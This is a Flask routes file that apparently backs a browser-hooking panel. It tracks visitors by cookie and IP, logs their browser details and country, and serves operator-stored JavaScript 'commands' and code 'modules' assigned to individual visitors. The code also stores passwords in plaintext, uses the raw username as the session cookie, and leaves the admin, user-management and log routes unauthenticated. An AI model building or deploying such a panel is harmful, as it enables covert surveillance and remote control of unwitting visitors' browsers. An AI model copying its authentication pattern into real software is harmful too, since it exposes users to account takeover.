from flask import render_template, request, redirect, url_for, jsonify, make_response
from flask_socketio import emit

from app import app, socketio
from app.utils import *

@app.route('/')
def home():
    conn = get_db_connection()
    users = conn.execute('SELECT * FROM users').fetchall()
    conn.close()
    no_users = len(users) == 0
    return render_template('index.html', no_users=no_users)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    conn = get_db_connection()
    user = conn.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password)).fetchone()
    conn.close()

    if user:
        response = make_response(redirect(url_for('dashboard')))
        response.set_cookie('user_id', user['username'])
        return response
    else:
        return "Invalid credentials. Please try again."

@app.route('/define_admin', methods=['POST'])
def define_admin():
    admin_username = request.form['admin_username']
    admin_password = request.form['admin_password']

    conn = get_db_connection()
    conn.execute('INSERT INTO users (username, password) VALUES (?, ?)', (admin_username, admin_password))
    conn.commit()
    conn.close()

    return redirect(url_for('home'))

@app.route('/logout')
def logout():
    response = make_response(redirect(url_for('home')))
    response.set_cookie('user_id', '', expires=0)
    return response

@app.route('/admin')
def admin_panel():
    conn = get_db_connection()
    users = conn.execute('SELECT * FROM users').fetchall()
    js_commands = conn.execute('SELECT * FROM js_commands').fetchall()
    conn.close()
    return render_template('admin.html', users=users, js_commands=js_commands)

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/delete_log/<int:log_id>', methods=['POST'])
def handle_delete_log(log_id):
    delete_log(log_id)
    return jsonify(success=True)

@app.route('/logs', methods=['GET'])
def get_logs():
    logs = get_all_logs()
    return jsonify(logs=logs)

@app.route('/modules')
def modules():
    return render_template('modules.html')

@app.route('/get_modules', methods=['GET'])
def get_modules():
    conn = get_db_connection()
    modules = conn.execute('SELECT * FROM modules').fetchall()
    conn.close()
    return jsonify(modules=[dict(module) for module in modules])

@app.route('/save_module', methods=['POST'])
def save_module():
    module_info = request.json
    name = module_info['name']
    code = module_info['code']

    conn = get_db_connection()
    conn.execute('INSERT INTO modules (name, code) VALUES (?, ?)', (name, code))
    conn.commit()
    conn.close()
    return jsonify(success=True)

@app.route('/delete_module/<int:module_id>', methods=['POST'])
def delete_module(module_id):
    conn = get_db_connection()
    conn.execute('DELETE FROM modules WHERE id = ?', (module_id,))
    conn.commit()
    conn.close()
    return jsonify(success=True)

@app.route('/get_assigned_modules/<int:log_id>', methods=['GET'])
def get_assigned_modules(log_id):
    conn = get_db_connection()
    assigned_modules = conn.execute('SELECT module_id FROM log_module WHERE log_id = ?', (log_id,)).fetchall()
    conn.close()
    return jsonify([module['module_id'] for module in assigned_modules])

@app.route('/assign_modules', methods=['POST'])
def assign_modules():
    assignments = request.json

    conn = get_db_connection()
    for assignment in assignments:
        log_id = assignment['logId']
        module_ids = assignment['moduleIds']

        conn.execute('DELETE FROM log_module WHERE log_id = ?', (log_id,))

        for module_id in module_ids:
            conn.execute('INSERT INTO log_module (log_id, module_id) VALUES (?, ?)', (log_id, module_id))
    conn.commit()
    conn.close()
    return jsonify(success=True)

@socketio.on('connect')
def handle_connect():
    emit('update_table', get_all_logs())

@app.route('/admin_manage', methods=['GET', 'POST'])
def admin_manage():
    conn = get_db_connection()
    if request.method == 'POST':
        action = request.form['action']
        if action == 'add_user':
            username = request.form['username']
            password = request.form['password']
            conn.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
            conn.commit()
        elif action == 'delete_user':
            username = request.form['username']
            conn.execute('DELETE FROM users WHERE username = ?', (username,))
            conn.commit()

    users = conn.execute('SELECT * FROM users').fetchall()
    conn.close()
    return render_template('admin_manage.html', users=users)

@app.route('/track_ip')
def track_ip():
    user_ip = request.remote_addr
    country = get_country_from_ip(user_ip)

    user_id = request.cookies.get('user_id')
    if not user_id:
        user_id = str(uuid.uuid4())
        response = make_response(render_template('track_ip.html', user_ip=user_ip, country=country, js_commands=[]))
        response.set_cookie('user_id', user_id)
        return response
    else:
        js_commands = get_js_commands(user_id)
        return render_template('track_ip.html', user_ip=user_ip, country=country, js_commands=js_commands)

@app.route('/log_browser_info', methods=['POST'])
def log_browser_info_route():
    browser_info = request.json
    browser_info['ip'] = request.remote_addr
    browser_info['user_id'] = request.cookies.get('user_id')
    browser_info['country'] = get_country_from_ip(browser_info['ip'])

    if is_duplicate_log(browser_info):
        print("Duplicate log detected, not inserted:", browser_info)
        return jsonify(success=False, message="Duplicate log detected")

    log_browser_info(browser_info)
    return jsonify(success=True)
